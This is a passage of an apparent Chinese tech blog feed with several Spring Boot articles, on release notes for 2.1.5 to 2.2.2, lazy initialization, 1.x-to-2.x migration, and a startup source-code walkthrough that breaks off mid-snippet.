      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.1.5%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C1.5.x%20%E5%8D%B3%E5%B0%86%E7%BB%93%E6%9D%9F%E4%BD%BF%E5%91%BD%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 官网在 2019&#x2F;03&#x2F;15 这天发布了 Spring Boot 2.1.5 正式版，栈长表示真跟不上了。。</p><p>官宣如下 ：</p><blockquote><p><a href="https://spring.io/blog/2019/05/15/spring-boot-2-1-5-released">https://spring.io/blog/2019/05/15/spring-boot-2-1-5-released</a></p></blockquote><p>仓库也已经跟上：</p><p><img src="http://img.javastack.cn/20190516154242.png"></p><p><strong>那这个版本有什么新功能？</strong></p><p>1、增加了 Spring Session DefaultCookieSerializer 自动化配置；</p><p>2、增加了 MimeTypes 缓存，提升性能；</p><p>这两个是什么鬼，表示还没用到过。</p><p>另外就是修复一推的bug了，以及更新一些依赖包。。具体的可以参考这里：</p><blockquote><p><a href="https://github.com/spring-projects/spring-boot/releases/tag/v2.1.5.RELEASE">https://github.com/spring-projects/spring-boot/releases/tag/v2.1.5.RELEASE</a></p></blockquote><p>这个版本没啥大更新，只是例行公事更新下罢了，那么下面的事项你就得注意了，官方又发通知了。</p><p><strong>重点来了！！！</strong></p><p>友情提醒：</p><p>Spring Boot 1.5.x 将于 2019&#x2F;08&#x2F;01 结束使命，官方不再更新维护了，建议大家迁移到 Spring Boot 2.x 上面来。</p><p>Spring Boot 2.x 最低支持 JDK 8+，如果你的 Spring Boot 1.x 用的 JDK 1.7，那升级就要注意兼容性了。</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li><li>……</li></ul><p>栈长将继续第一时间在公众号推送 Spring Boot 最新进展及热门技术教程。最后，大家用的哪个版本呢？欢迎留言~</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.2 增加了一个新功能，启动飞起~</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2%20%E5%A2%9E%E5%8A%A0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%B0%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%90%AF%E5%8A%A8%E9%A3%9E%E8%B5%B7~/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2%20%E5%A2%9E%E5%8A%A0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%B0%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%90%AF%E5%8A%A8%E9%A3%9E%E8%B5%B7~/</url>
      
        <content type="html"><![CDATA[<p>前几天栈长分享了一个好玩的框架：<a href="https://mp.weixin.qq.com/s/bQsfgYQ01CEk3PQlvc356A">一个比Spring Boot快44倍的Java框架！</a>，是不是感觉 Spring Boot 略慢？今天讲一下 Spring Boot 添加的这个新特性，可以大大提升 Spring Boot 的启动速度。</p><p>最近，Spring团队宣布在 Spring Boot 2.2+ 中添加了一个重要功能：延迟加载，目前这个版本暂时还是快照版，不过我们可以先了解下怎么使用这个延迟加载功能。</p><h4 id="延迟加载是什么意思？"><a href="#延迟加载是什么意思？" class="headerlink" title="延迟加载是什么意思？"></a>延迟加载是什么意思？</h4><p>有点经验的程序员应该都知道，在 Spring 框架中早已经支持延迟加载功能的，简单来说就是一个类的实例化，不需要 Spring 容器启动的时候就开始实例化，而是在第一次需要它的时候再实例化，这样大大提升了程序启动速度，也在一定程序上节省了系统资源。</p><h4 id="怎么开启延迟加载？"><a href="#怎么开启延迟加载？" class="headerlink" title="怎么开启延迟加载？"></a>怎么开启延迟加载？</h4><p>在传统 Spring 项目中我们是这么做的：</p><pre class="line-numbers language-none"><code class="language-none">&lt;bean id&#x3D;&quot;testBean&quot; calss&#x3D;&quot;cn.javastack.TestBean&quot; lazy-init&#x3D;&quot;true&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上 bean 配置是不是很熟悉？</p><p>没错，加了 <code>lazy-init=&quot;true&quot;</code> 表示延迟加载，默认不加为false，表示容器启动时立即加载。</p><p>在 Spring 3.0+ 之后也可以这么做：</p><pre class="line-numbers language-none"><code class="language-none">@Lazypublic TestBean testBean() &#123;return new TestBean();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>@Lazy：默认值为true，表示延迟加载；</p><h4 id="Spring-Boot如何开启？"><a href="#Spring-Boot如何开启？" class="headerlink" title="Spring Boot如何开启？"></a>Spring Boot如何开启？</h4><p>由上面的例子我们可以知道，在任何 Spring Boot 版本中其实是支持 Bean 的延迟加载的，但这样是需要我们手工去配置的，这样会比较麻烦。</p><p>在 Spring Boot 2.2+ 中，延期加载将变得更加简单，有几下几种配置方式：</p><ul><li>参数：spring.main.lazy-initialization</li><li>类：SpringApplication</li><li>类：SpringApplicationBuilder</li></ul><p>通过以上几种方式设置成：true，容器中的 Bean 就将配置成延迟加载。</p><p>Spring Boot 项目在 IDE 中再配合 DevTools 工具，可以使本发开发环境启动变得更快，400ms就可以启动起来了，大大提高了开发效率。</p><h4 id="延迟加载有没有缺点？"><a href="#延迟加载有没有缺点？" class="headerlink" title="延迟加载有没有缺点？"></a>延迟加载有没有缺点？</h4><p>延迟加载确实可以大大减少应用程序的启动时间，还能节省系统资源，那么问题来了，你可能会问，为什么不默认开启它呢？为什么还要额外提供一个配置？</p><p>听栈长道来，延迟加载确实有很多好处，但也会造成一些在启动的时候就能发现而要等到延迟加载才发现的问题，如：内存不足啊、类找不到啊、又或者是配置错误引发的系列问题。</p><p>还有一个问题就是，因为第一次请求的时候才去实例化，可能造成第一个请求变慢，响应延迟，体验不是很好。这样一来，对负载均衡和自动伸缩方面也会有不利影响。</p><h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><p>正如我们在上面所分析到的，延迟加载确实可以显着改善启动时间，但也有一些明显的缺点，所以我们一定小心谨慎的启用它。或者我们可以对项目进行评估下，延迟加载真的对我们的项目有这么重要或者急迫么？</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li><li>……</li></ul><p>最后，你们是怎么应用延迟加载功能的，欢迎留言分享~</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.2.1 发布，一个有点坑的版本！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2.1%20%E5%8F%91%E5%B8%83%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%9C%89%E7%82%B9%E5%9D%91%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2.1%20%E5%8F%91%E5%B8%83%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%9C%89%E7%82%B9%E5%9D%91%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>上一篇：<a href="https://mp.weixin.qq.com/s/3TF6ooiW3JUzSGeAiQ9m8g">Spring Boot 2.2.0 正式发布，支持 JDK 13！</a></p><p>Spring Boot 2.2.0 没发布多久，Spring Boot 2.2.1 又发布了，这是一个很有意思，又有点 “坑” 的一个版本。</p><p>除了日常的 bug 修复、优化提升、依赖升级，这个版本又颠覆了一个 Spring Boot 2.2.0 配置。</p><p>如果你已经升级到了 Spring Boot 2.2.0，<code>@ConfigurationProperties</code> 注解是可以不需要定义 Bean 直接使用的。</p><p><code>@ConfigurationProperties</code>如何使用，可以看这篇文章：<br><a href="https://mp.weixin.qq.com/s/aen2PIh0ut-BSHad-Bw7hg">Spring Boot读取配置的几种方式</a></p><p>来看下使用区别，真是够折腾的几个版本。</p><p><strong>Spring Boot 2.2.0 之前：</strong></p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConfigurationProperties(prefix &#x3D; &quot;xxx&quot;)public class XXXProperties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>Spring Boot 2.2.0：</strong></p><pre class="line-numbers language-none"><code class="language-none">@ConfigurationProperties(prefix &#x3D; &quot;xxx&quot;)public class XXXProperties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看见没，不需要定义 Bean，可以直接被自动扫描到。</p><p>而在 Spring Boot 2.2.1 中又作了调整：</p><p><strong>Spring Boot 2.2.1：</strong></p><p><img src="http://img.javastack.cn/20191108112508.png"></p><p><code>@ConfigurationProperties</code> 自动扫描支持被废弃，恢复到 2.2.0 之前的用法了，又加了一个新的配置方法：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConfigurationProperties(prefix &#x3D; &quot;xxx&quot;)public class XXXProperties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者是：</p><pre class="line-numbers language-none"><code class="language-none">@ConfigurationProperties(prefix &#x3D; &quot;xxx&quot;)public class XXXProperties@SpringBootApplication@ConfigurationPropertiesScan@EnableConfigurationPropertiespublic class Application <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个版本加了一个 <code>@ConfigurationPropertiesScan</code> 注解，用来主动扫描没有定义 Bean 的 <code>@ConfigurationProperties</code>，相当于一个总开关，我觉得倒挺好的。</p><p>如果从 Spring Boot 2.2.0 过度到 Spring Boot 2.2.1，对于这个配置，如果不注意，就可能会有问题。</p><p>所以，千万别升级太快，否则是给自己挖坑……</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.2.2 发布，新增 2 个新特性！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2.2%20%E5%8F%91%E5%B8%83%EF%BC%8C%E6%96%B0%E5%A2%9E%202%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.2.2%20%E5%8F%91%E5%B8%83%EF%BC%8C%E6%96%B0%E5%A2%9E%202%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 2.2.2 发布咯！</p><p><a href="https://mp.weixin.qq.com/s/zkDj73GVtE4oBaK2ucHfLw">Spring Boot 2.2.1 发布，一个有点坑的版本！</a></p><p>2.2.1 发布没过一个月，2.2.2 就来了。</p><p>Maven依赖给大家奉上：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;  &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;spring-boot&lt;&#x2F;artifactId&gt;  &lt;version&gt;2.2.2.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个版本都更新了啥？</p><h4 id="新增了两个新特性"><a href="#新增了两个新特性" class="headerlink" title="新增了两个新特性"></a>新增了两个新特性</h4><p><strong>1、支持在第三方类上的构造器参数绑定；</strong></p><p>什么是构造器参数绑定？看下栈长之前写的这篇文章：<a href="https://mp.weixin.qq.com/s/mk1nB4_EHSjMaQqJ_RAz8w">Spring Boot 构造器参数绑定，越来越强大了！</a></p><p><strong>2、支持 Gradle 6；</strong></p><h4 id="日常维护"><a href="#日常维护" class="headerlink" title="日常维护"></a>日常维护</h4><p>修复了 88 个bug、性能优化、依赖更新。</p><p>一大周末的起来更新文章，四季如夏的深圳，我却裹着棉大衣在这写文章，不可思议吧，今年的深圳似乎比以往要冷一些，或者是我不再习惯老家寒冷的天气了，在深圳久了，抵抗力差了。</p><p><img src="http://img.javastack.cn/20191207113352.png"></p><p>怀念老家烤火有木有~</p><p>最后祝大家周末愉快，学习倍儿棒！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.x 与 1.x 的区别，以及如何做版本迁移</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E4%B8%8E%201.x%20%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%81%9A%E7%89%88%E6%9C%AC%E8%BF%81%E7%A7%BB/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E4%B8%8E%201.x%20%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%81%9A%E7%89%88%E6%9C%AC%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>这一篇文章主要讲解 Spring Boot 2.x 与 1.5.x 的区别，2.x 主要更新了什么东西，以便对 Spring Boot 2.x 有一个详细的了解。</p><p>本文讲的 1.x 指的是 <code>1.5.10</code>, 2.x 指的是 <code>2.0.0</code>。</p><p><img src="http://img.javastack.cn/18-7-2/81467719.jpg"></p><ul><li><strong>配置变更</strong></li></ul><p>在 2.x 中废除了一些 1.x 中的配置，并增加了许多新配置，详细请查看以下链接中的变更表格。</p><blockquote><p><a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Configuration-Changelog">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Configuration-Changelog</a></p></blockquote><ul><li><strong>依赖 JDK 版本升级</strong></li></ul><p>2.x 至少需要 JDK 8 的支持，2.x 里面的许多方法应用了 JDK 8 的许多高级新特性，所以你要升级到 2.0 版本，先确认你的应用必须兼容 JDK 8。</p><p>另外，2.x 开始了对 JDK 9 的支持。</p><ul><li><strong>第三方类库升级</strong></li></ul><p>2.x 对第三方类库升级了所有能升级的稳定版本，一些值得关注的类库升级我给列出来了。</p><ol><li><p>Spring Framework 5+</p></li><li><p>Tomcat 8.5+</p></li><li><p>Flyway 5+</p></li><li><p>Hibernate 5.2+</p></li><li><p>Thymeleaf 3+</p></li></ol><ul><li><strong>响应式 Spring 编程支持</strong></li></ul><p>2.x 通过启动器和自动配置全面支持 Spring 的响应式编程，响应式编程是完全异步和非阻塞的，它是基于事件驱动模型，而不是传统的线程模型。就连 Spring Boot 内部也对一些功能点进行了有必要的响应式升级，最值得注意的是对内嵌式容器的支持。</p><p><strong>对响应式编程支持又包括以下几个技术模块。</strong></p><ol><li><p>Spring WebFlux &amp; WebFlux.fn 支持</p></li><li><p>响应式 Spring Data 支持</p></li><li><p>响应式 Spring Security 支持</p></li><li><p>内嵌式的 Netty 服务器支持</p></li></ol><ul><li><strong>HTTP&#x2F;2 支持</strong></li></ul><p>提供对HTTP&#x2F;2 的支持，如：Tomcat, Undertow, Jetty，这个得依赖具体选择的应用服务器和应用环境。</p><ul><li><strong>配置属性绑定</strong></li></ul><p>在 1.x 中，配置绑定是通过注解 <code>@ConfigurationProperties</code> 来注入到 Spring 环境变量中的。</p><p>在 2.x 中，配置绑定功能有了些的改造，在调整了 1.x 中许多不一致地方之外，还提供了独立于注解之外的 API 来装配配置属性。并增加了属性来源，这样你就能知道这些属性是从哪个配置文件中加载进来的。</p><ul><li><strong>Gradle 插件</strong></li></ul><p>Spring Boot的 Gradle 插件全面重写了，并且最小支持 Gradle 4+ 以便提供一些重要的特性提升。</p><ul><li><strong>Kotlin</strong></li></ul><p>2.x 开始提供对 Kotlin 1.2 的支持，并且提供了一个 <code>runApplication</code> 函数来运行 Spring Boot 应用。</p><ul><li><strong>Actuator加强</strong></li></ul><p>在 2.x 中，对执行器端点进行了许多改进，所有的 HTTP 执行端点现在都暴露在 <code>/actuator</code> 路径下，并对 JSON 结果集也做了改善。</p><ul><li><strong>Data 支持</strong></li></ul><p>上面有说到对响应式 Spring Data 的支持，除此之外，其他 Data 模块也做了许多更新和提升，具体体现在以下几个地方。</p><ol><li><p>2.x 默认使用 <code>HikariCP</code> 连接池；</p></li><li><p>更加合理化的优化了数据库初始化逻辑；</p></li><li><p><code>spring.jdbc.template</code> 自动配置现在可以通过 <code>spring.jdbc.template</code> 属性定制；</p></li><li><p>提供了新配置 <code>spring.jdbc.template</code> 方便分页和排序；</p></li><li><p>对数据库 <code>spring.jdbc.template</code> 自动化配置支持；</p></li><li><p>可以高级定制 <code>MongoDB</code> 客户端；</p></li><li><p>可以通过 <code>spring.cache.redis.*</code> 来配置 <code>Redis</code> 缓存默认值。</p></li></ol><ul><li><strong>Web加强</strong></li></ul><p>除了上面说了 2.x 对响应式框架的支持，还包括以下几个 web 开发改进。</p><ol><li><p>使用内嵌式容器时，context path 会和端口一起记录并打印出来；</p></li><li><p>所有支持的容器都支持过滤器的初始化；</p></li><li><p>Thymeleaf 开始支持 <code>javax.time</code> 类型；</p></li><li><p>提供了一个 <code>spring-boot-starter-json</code> 启动器对 JSON 读写的支持。</p></li></ol><ul><li><strong>Quartz支持</strong></li></ul><p>2.x 提供了一个 <code>spring-boot-starter-quartz</code> 启动器对定时任务框架 Quartz 的支持；</p><ul><li><strong>测试加强</strong></li></ul><p>在 2.x 中，对测试模块有了一些调整。</p><ul><li><p><strong>其他一些改进</strong></p></li><li><p><strong>动态启动图案支持</strong></p></li></ul><p>如下图所示，是不是很酷。。</p><p><img src="http://img.javastack.cn/18-5-8/32572123.jpg"></p><h2 id="迁移指南"><a href="#迁移指南" class="headerlink" title="迁移指南"></a>迁移指南</h2><p>从 1.5.x 可以顺利升级到 2.x，如果你的应用还停留在 1.5.x 之前的版本，建议先升级到 1.5.x，而不是直接升级到 2.x，这样的升级风险最小。</p><p>详细的迁移说明有点多，这里就不一一介绍了，具体请阅读官方迁移文档：</p><blockquote><p><a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.x 启动全过程源码分析（上）入口类剖析</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E5%90%AF%E5%8A%A8%E5%85%A8%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%89%96%E6%9E%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E5%90%AF%E5%8A%A8%E5%85%A8%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%89%96%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 的应用教程我们已经分享过很多了，今天来通过源码来分析下它的启动过程，探究下 Spring Boot 为什么这么简便的奥秘。</p><p>本篇基于 Spring Boot 2.0.3 版本进行分析，阅读本文需要有一些 Java 和 Spring 框架基础，如果还不知道 Spring Boot 是什么，建议先看下我们的 Spring Boot 教程。</p><h3 id="Spring-Boot-的入口类"><a href="#Spring-Boot-的入口类" class="headerlink" title="Spring Boot 的入口类"></a>Spring Boot 的入口类</h3><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class SpringBootBestPracticeApplication &#123;public static void main(String[] args) &#123;SpringApplication.run(SpringBootBestPracticeApplication.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做过 Spring Boot 项目的都知道，上面是 Spring Boot 最简单通用的入口类。入口类的要求是最顶层包下面第一个含有 main 方法的类，使用注解 <code>@SpringBootApplication</code> 来启用 Spring Boot 特性，使用 <code>SpringApplication.run</code> 方法来启动 Spring Boot 项目。</p><p>来看一下这个类的 <code>run</code> 方法调用关系源码：</p><pre class="line-numbers language-none"><code class="language-none">public static ConfigurableApplicationContext run(Class&lt;?&gt; primarySource,String... args) &#123;return run(new Class&lt;?&gt;[] &#123; primarySource &#125;, args);&#125;public static ConfigurableApplicationContext run(Class&lt;?&gt;[] primarySources,String[] args) &#123;return new SpringApplication(primarySources).run(args);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个参数 <code>primarySource</code>：加载的主要资源类</p><p>第二个参数 <code>args</code>：传递给应用的应用参数</p><p>先用主要资源类来实例化一个 <code>SpringApplication</code> 对象，再调用这个对象的 <code>run</code> 方法，所以我们分两步来分析这个启动源码。</p><h3 id="SpringApplication-的实例化过程"><a href="#SpringApplication-的实例化过程" class="headerlink" title="SpringApplication 的实例化过程"></a>SpringApplication 的实例化过程</h3><p><img src="http://img.javastack.cn/18-7-2/69983860.jpg"></p><p>接着上面的 <code>SpringApplication</code> 构造方法进入以下源码：</p><pre class="line-numbers language-none"><code class="language-none">public SpringApplication(Class&lt;?&gt;... primarySources) &#123;this(null, primarySources);&#125;public SpringApplication(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources) &#123;    &#x2F;&#x2F; 1、资源初始化资源加载器为 nullthis.resourceLoader &#x3D; resourceLoader;&#x2F;&#x2F; 2、断言主要加载资源类不能为 null，否则报错Assert.notNull(primarySources, &quot;PrimarySources must not be null&quot;);&#x2F;&#x2F; 3、初始化主要加载资源类集合并去重this.primarySources &#x3D; new LinkedHashSet&lt;&gt;(Arrays.asList(primarySources));&#x2F;&#x2F; 4、推断当前 WEB 应用类型this.webApplicationType &#x3D; deduceWebApplicationType();&#x2F;&#x2F; 5、设置应用上线文初始化器setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));    &#x2F;&#x2F; 6、设置监听器setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));&#x2F;&#x2F; 7、推断主入口应用类this.mainApplicationClass &#x3D; deduceMainApplicationClass();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知这个构造器类的初始化包括以下 7 个过程。</p><h4 id="1、资源初始化资源加载器为-null"><a href="#1、资源初始化资源加载器为-null" class="headerlink" title="1、资源初始化资源加载器为 null"></a>1、资源初始化资源加载器为 null</h4><pre class="line-numbers language-none"><code class="language-none">this.resourceLoader &#x3D; resourceLoader;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2、断言主要加载资源类不能为-null，否则报错"><a href="#2、断言主要加载资源类不能为-null，否则报错" class="headerlink" title="2、断言主要加载资源类不能为 null，否则报错"></a>2、断言主要加载资源类不能为 null，否则报错</h4><pre class="line-numbers language-none"><code class="language-none">Assert.notNull(primarySources, &quot;PrimarySources must not be null&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、初始化主要加载资源类集合并去重"><a href="#3、初始化主要加载资源类集合并去重" class="headerlink" title="3、初始化主要加载资源类集合并去重"></a>3、初始化主要加载资源类集合并去重</h4><pre class="line-numbers language-none"><code class="language-none">this.primarySources &#x3D; new LinkedHashSet&lt;&gt;(Arrays.asList(primarySources));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、推断当前-WEB-应用类型"><a href="#4、推断当前-WEB-应用类型" class="headerlink" title="4、推断当前 WEB 应用类型"></a>4、推断当前 WEB 应用类型</h4><pre class="line-numbers language-none"><code class="language-none">this.webApplicationType &#x3D; deduceWebApplicationType();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来看下 <code>deduceWebApplicationType</code> 方法和相关的源码：</p><pre class="line-numbers language-none"><code class="language-none">private WebApplicationType deduceWebApplicationType() &#123;if (ClassUtils.isPresent(REACTIVE_WEB_ENVIRONMENT_CLASS, null)&amp;&amp; !ClassUtils.isPresent(MVC_WEB_ENVIRONMENT_CLASS, null)) &#123;return WebApplicationType.REACTIVE;&#125;for (String className : WEB_ENVIRONMENT_CLASSES) &#123;if (!ClassUtils.isPresent(className, null)) &#123;return WebApplicationType.NONE;&#125;&#125;return WebApplicationType.SERVLET;&#125;private static final String REACTIVE_WEB_ENVIRONMENT_CLASS &#x3D; &quot;org.springframework.&quot;+ &quot;web.reactive.DispatcherHandler&quot;;private static final String MVC_WEB_ENVIRONMENT_CLASS &#x3D; &quot;org.springframework.&quot;+ &quot;web.servlet.DispatcherServlet&quot;;private static final String[] WEB_ENVIRONMENT_CLASSES &#x3D; &#123; &quot;javax.servlet.Servlet&quot;,&quot;org.springframework.web.context.ConfigurableWebApplicationContext&quot; &#125;;public enum WebApplicationType &#123;&#x2F;** * 非 WEB 项目 *&#x2F;NONE,&#x2F;** * SERVLET WEB 项目 *&#x2F;SERVLET,&#x2F;** * 响应式 WEB 项目 *&#x2F;REACTIVE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个就是根据类路径下是否有对应项目类型的类推断出不同的应用类型。</p><h4 id="5、设置应用上线文初始化器"><a href="#5、设置应用上线文初始化器" class="headerlink" title="5、设置应用上线文初始化器"></a>5、设置应用上线文初始化器</h4><pre class="line-numbers language-none"><code class="language-none">setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong><code>ApplicationContextInitializer</code> 的作用是什么？源码如下。</strong></p><pre class="line-numbers language-none"><code class="language-none">public interface ApplicationContextInitializer&lt;C extends ConfigurableApplicationContext&gt; &#123;    &#x2F;** * Initialize the given application context. * @param applicationContext the application to configure *&#x2F;void initialize(C applicationContext);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用来初始化指定的 Spring 应用上下文，如注册属性资源、激活 Profiles 等。</p><p>来看下 <code>setInitializers</code> 方法源码，其实就是初始化一个 <code>ApplicationContextInitializer</code> 应用上下文初始化器实例的集合。</p><pre class="line-numbers language-none"><code class="language-none">public void setInitializers(Collection&lt;? extends ApplicationContextInitializer&lt;?&gt;&gt; initializers) &#123;this.initializers &#x3D; new ArrayList&lt;&gt;();this.initializers.addAll(initializers);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看下这个初始化 <code>getSpringFactoriesInstances</code> 方法和相关的源码：</p><pre class="line-numbers language-none"><code class="language-none">private &lt;T&gt; Collection&lt;T&gt; getSpringFactoriesInstances(Class&lt;T&gt; type) &#123;return getSpringFactoriesInstances(type, new Class&lt;?&gt;[] &#123;&#125;);&#125;private &lt;T&gt; Collection&lt;T&gt; getSpringFactoriesInstances(Class&lt;T&gt; type,Class&lt;?&gt;[] parameterTypes, Object... args) &#123;ClassLoader classLoader &#x3D; Thread.currentThread().getContextClassLoader();&#x2F;&#x2F; Use names and ensure unique to protect against duplicatesSet&lt;String&gt; names &#x3D; new LinkedHashSet&lt;&gt;(SpringFactoriesLoader.loadFactoryNames(type, classLoader));List&lt;T&gt; instances &#x3D; createSpringFactoriesInstances(type, parameterTypes,classLoader, args, names);AnnotationAwareOrderComparator.sort(instances);return instances;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置应用上下文初始化器可分为以下 5 个步骤。</p><p><strong>5.1）获取当前线程上下文类加载器</strong></p><pre class="line-numbers language-none"><code class="language-none">ClassLoader classLoader &#x3D; 